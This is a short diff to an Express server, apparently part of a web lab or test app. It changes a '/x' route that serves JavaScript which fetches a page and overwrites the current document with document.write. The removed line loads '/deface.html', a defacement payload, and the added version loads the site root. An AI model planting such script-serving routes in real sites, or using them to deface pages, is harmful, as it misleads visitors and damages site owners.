@@ -118,7 +118,9 @@ TypingText.runAll();
     `);
 });
 
-app.get('/x', (res) => {res.send(`fetch('/deface.html').then(r=>r.text()).then(t=>document.write(t))`);};
+app.get('/x', (req, res) => {
+  res.type('application/javascript').send(`fetch('/').then(r=>r.text()).then(t=>document.write(t))`);
+});
 
 app.get('/login', (req, res) => {
     res.sendFile(path.join(__dirname, 'public', 'login.html'))
